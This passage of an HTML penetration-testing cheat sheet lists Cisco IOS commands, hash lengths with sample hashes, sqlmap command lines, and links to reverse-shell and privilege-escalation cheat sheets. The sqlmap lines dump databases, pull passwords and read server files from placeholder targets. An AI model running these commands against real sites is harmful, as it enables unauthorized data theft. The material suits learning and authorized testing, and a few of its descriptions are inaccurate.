<tr>
<td>x6c</td>
<td>l</td>
</tr>
<tr>
<td>x6d</td>
<td>m</td>
</tr>
<tr>
<td>x6e</td>
<td>n</td>
</tr>
<tr>
<td>x6f</td>
<td>o</td>
</tr>
<tr>
<td>x70</td>
<td>p</td>
</tr>
<tr>
<td>x71</td>
<td>q</td>
</tr>
<tr>
<td>x72</td>
<td>r</td>
</tr>
<tr>
<td>x73</td>
<td>s</td>
</tr>
<tr>
<td>x74</td>
<td>t</td>
</tr>
<tr>
<td>x75</td>
<td>u</td>
</tr>
<tr>
<td>x76</td>
<td>v</td>
</tr>
<tr>
<td>x77</td>
<td>w</td>
</tr>
<tr>
<td>x78</td>
<td>x</td>
</tr>
<tr>
<td>x79</td>
<td>y</td>
</tr>
<tr>
<td>x7a</td>
<td>z</td>
</tr>
</tbody>
</table>
<h2>CISCO IOS Commands</h2>
<p>A collection of useful Cisco IOS commands.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>enable</td>
<td>Enters enable mode</td>
</tr>
<tr>
<td>conf t</td>
<td>Short for, configure terminal</td>
</tr>
<tr>
<td>(config)# interface fa0/0</td>
<td>Configure FastEthernet 0/0</td>
</tr>
<tr>
<td>(config-if)# ip addr 0.0.0.0 255.255.255.255</td>
<td>Add ip to fa0/0</td>
</tr>
<tr>
<td>(config-if)# ip addr 0.0.0.0 255.255.255.255</td>
<td>Add ip to fa0/0</td>
</tr>
<tr>
<td>(config-if)# line vty 0 4</td>
<td>Configure vty line</td>
</tr>
<tr>
<td>(config-line)# login</td>
<td>Cisco set telnet password</td>
</tr>
<tr>
<td>(config-line)# password YOUR-PASSWORD</td>
<td>Set telnet password</td>
</tr>
<tr>
<td># show running-config</td>
<td>Show running config loaded in memory</td>
</tr>
<tr>
<td># show startup-config</td>
<td>Show sartup config</td>
</tr>
<tr>
<td># show version</td>
<td>show cisco IOS version</td>
</tr>
<tr>
<td># show session</td>
<td>display open sessions</td>
</tr>
<tr>
<td># show ip interface</td>
<td>Show network interfaces</td>
</tr>
<tr>
<td># show interface e0</td>
<td>Show detailed interface info</td>
</tr>
<tr>
<td># show ip route</td>
<td>Show routes</td>
</tr>
<tr>
<td># show access-lists</td>
<td>Show access lists</td>
</tr>
<tr>
<td># dir file systems</td>
<td>Show available files</td>
</tr>
<tr>
<td># dir all-filesystems</td>
<td>File information</td>
</tr>
<tr>
<td># dir /all</td>
<td>SHow deleted files</td>
</tr>
<tr>
<td># terminal length 0</td>
<td>No limit on terminal output</td>
</tr>
<tr>
<td># copy running-config tftp</td>
<td>Copys running config to tftp server</td>
</tr>
<tr>
<td># copy running-config startup-config</td>
<td>Copy startup-config to running-config</td>
</tr>
</tbody>
</table>
<h2>Cryptography</h2>
<h3>Hash Lengths</h3>
<table>
<thead>
<tr>
<th>Hash</th>
<th>Size</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5 Hash Length</td>
<td>16 Bytes</td>
</tr>
<tr>
<td>SHA-1 Hash Length</td>
<td>20 Bytes</td>
</tr>
<tr>
<td>SHA-256 Hash Length</td>
<td>32 Bytes</td>
</tr>
<tr>
<td>SHA-512 Hash Length</td>
<td>64 Bytes</td>
</tr>
</tbody>
</table>
<h3>Hash Examples</h3>
<p>Likely just use hash-identifier for this but here are some example hashes:</p>
<table>
<thead>
<tr>
<th>Hash</th>
<th>Example</th>
</tr>
</thead>
<tbody>
<tr>
<td>MD5 Hash Example</td>
<td>8743b52063cd84097a65d1633f5c74f5</td>
</tr>
<tr>
<td>MD5 $PASS:$SALT Example</td>
<td>01dfae6e5d4d90d9892622325959afbe:7050461</td>
</tr>
<tr>
<td>MD5 $SALT:$PASS</td>
<td>f0fda58630310a6dd91a7d8f0a4ceda2:4225637426</td>
</tr>
<tr>
<td>SHA1 Hash Example</td>
<td>b89eaac7e61417341b710b727768294d0e6a277b</td>
</tr>
<tr>
<td>SHA1 $PASS:$SALT</td>
<td>2fc5a684737ce1bf7b3b239df432416e0dd07357:2014</td>
</tr>
<tr>
<td>SHA1 $SALT:$PASS</td>
<td>cac35ec206d868b7d7cb0b55f31d9425b075082b:5363620024</td>
</tr>
<tr>
<td>SHA-256</td>
<td>127e6fbfe24a750e72930c220a8e138275656b<br>
8e5d8f48a98c3c92df2caba935</td>
</tr>
<tr>
<td>SHA-256 $PASS:$SALT</td>
<td>c73d08de890479518ed60cf670d17faa26a4a7<br>
1f995c1dcc978165399401a6c4</td>
</tr>
<tr>
<td>SHA-256 $SALT:$PASS</td>
<td>eb368a2dfd38b405f014118c7d9747fcc97f4<br>
f0ee75c05963cd9da6ee65ef498:560407001617</td>
</tr>
<tr>
<td>SHA-512</td>
<td>82a9dda829eb7f8ffe9fbe49e45d47d2dad9<br>
664fbb7adf72492e3c81ebd3e29134d9bc<br>
12212bf83c6840f10e8246b9db54a4<br>
859b7ccd0123d86e5872c1e5082f</td>
</tr>
<tr>
<td>SHA-512 $PASS:$SALT</td>
<td>e5c3ede3e49fb86592fb03f471c35ba13e8<br>
d89b8ab65142c9a8fdafb635fa2223c24e5<br>
558fd9313e8995019dcbec1fb58414<br>
6b7bb12685c7765fc8c0d51379fd</td>
</tr>
<tr>
<td>SHA-512 $SALT:$PASS</td>
<td>976b451818634a1e2acba682da3fd6ef<br>
a72adf8a7a08d7939550c244b237c72c7d4236754<br>
4e826c0c83fe5c02f97c0373b6b1<br>
386cc794bf0d21d2df01bb9c08a</td>
</tr>
<tr>
<td>NTLM Hash Example</td>
<td>b4b9b02e6f09a9bd760f388b67351e2b</td>
</tr>
</tbody>
</table>
<h2>SQLMap Examples</h2>
<p>sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It comes with a powerful detection engine, many niche features for the ultimate penetration tester and a broad range of switches lasting from database fingerprinting, over data fetching from the database, to accessing the underlying file system and executing commands on the operating system via out-of-band connections.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>sqlmap -u http://meh.com –forms –batch –crawl=10<br>
–cookie=jsessionid=54321 –level=5 –risk=3</td>
<td>Automated sqlmap scan</td>
</tr>
<tr>
<td>sqlmap -u TARGET -p PARAM –data=POSTDATA –cookie=COOKIE<br>
–level=3 –current-user –current-db –passwords<br>
–file-read=”/var/www/blah.php”</td>
<td>Targeted sqlmap scan</td>
</tr>
<tr>
<td>sqlmap -u “http://meh.com/meh.php?id=1”<br>
–dbms=mysql –tech=U –random-agent –dump</td>
<td>Scan url for union + error based injection with mysql backend<br>
and use a random user agent + database dump</td>
</tr>
<tr>
<td>sqlmap -o -u “http://meh.com/form/” –forms</td>
<td>sqlmap check form for injection</td>
</tr>
<tr>
<td>sqlmap -o -u “http://meh/vuln-form” –forms<br>
-D database-name -T users –dump</td>
<td>sqlmap dump and crack hashes for table users on database-name.</td>
</tr>
</tbody>
</table>


MSFVenom Cheatsheet: https://hacktoday.io/t/msfvenom-cheatsheet/3150
Pentesting Cheatsheets: https://hacktoday.io/t/pentesting-cheatsheets/2635
SUID Executables - Linux Privilege Escalation Cheatsheet: https://hacktoday.io/t/suid-executables-linux-privilege-escalation-cheatsheet/2865
Steganography - Cheatsheet: https://hacktoday.io/t/steganography-cheatsheet/2261
Reverse Shell Cheatsheet: https://hacktoday.io/t/reverse-shell-cheat-sheet/2397
